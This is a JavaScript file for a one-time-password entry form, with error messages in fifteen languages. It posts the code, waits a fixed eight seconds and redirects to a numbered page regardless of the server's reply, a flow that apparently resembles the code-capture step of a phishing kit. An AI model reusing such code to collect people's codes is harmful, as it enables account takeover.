const messages = {
    en: {
        OTP1: "Don't be careless",
        otp1: "Incorrect OTP entered"
    },
    it: {
        OTP1: "Non essere distratto",
        otp1: "OTP inserito non corretto"
    },
    es: {
        OTP1: "No seas descuidado",
        otp1: "OTP ingresado incorrecto"
    },
    de: {
        OTP1: "Sei nicht nachlässig",
        otp1: "Falscher OTP eingegeben"
    },
    fr: {
        OTP1: "Ne sois pas négligent",
        otp1: "OTP incorrect saisi"
    },
    id: {
        OTP1: "Jangan ceroboh",
        otp1: "OTP yang dimasukkan salah"
    },
    ja: {
        OTP1: "不注意しないでください",
        otp1: "入力されたOTPが間違っています"
    },
    tw: {
        OTP1: "不要粗心大意",
        otp1: "輸入的OTP不正確"
    },
    th: {
        OTP1: "อย่าประมาท",
        otp1: "ป้อน OTP ไม่ถูกต้อง"
    },
    ph: {
        OTP1: "Huwag maging pabaya",
        otp1: "Maling OTP ang inilagay"
    },
    mh: {
        OTP1: "Jajej im jab ruōn eo",
        otp1: "OTP eo ej jab likit"
    },
    et: {
        OTP1: "Ära ole hooletu",
        otp1: "Vale OTP sisestatud"
    },
    pt: {
        OTP1: "Não seja descuidado",
        otp1: "OTP inserido incorretamente"
    },
    nl: {
        OTP1: "Wees niet onvoorzichtig",
        otp1: "Onjuiste OTP ingevoerd"
    },
    be: {
        OTP1: "Wees niet onvoorzichtig",
        otp1: "Onjuiste OTP ingevoerd"
    }

};



function validateLength(input) {
    const value = input.value;

    const lang = document.documentElement.lang || 'en';

    if (!/^\d{0,8}$/.test(value)) {
        input.value = value.slice(0, -1); 
    }

    if (value.length > 8) {
        input.value = value.slice(0, 8);
    }
}

function validateForm(event) {
    event.preventDefault(); 
    const OTP = document.querySelector('#OTP1');
    const OTP_err = document.querySelector('.OTP_err');
    const submitButton = document.querySelector('#submitButton');
    const spinner = document.querySelector('.spinner');
    
    OTP_err.textContent = '';

    let isValid = true;
    const lang = document.documentElement.lang || 'en';

    if (OTP.value == "") {
        OTP_err.textContent = messages[lang].OTP1; 
        isValid = false;
    } else if (!/^\d{6}$/.test(OTP.value) && !/^\d{8}$/.test(OTP.value)) {
        OTP_err.textContent = messages[lang].otp1; 
        isValid = false;
    }

    if (isValid) {
        submitButton.classList.add('loading');
        spinner.style.display = "inline-block";
        submitButton.querySelector('.button-text').style.display = 'none';

        const formData = new FormData(event.target);
        fetch(event.target.action, {
            method: 'POST',
            body: formData
        }).then(response => {
            setTimeout(() => {
                window.location.href = '/5';
            }, 8000);
        }).catch(error => {
            console.error("Error when sending data:", error);
            spinner.style.display = 'none';
            submitButton.querySelector('.button-text').style.display = 'inline';
            alert("An error occurred while sending the data, please try again.");
        });
    }
}
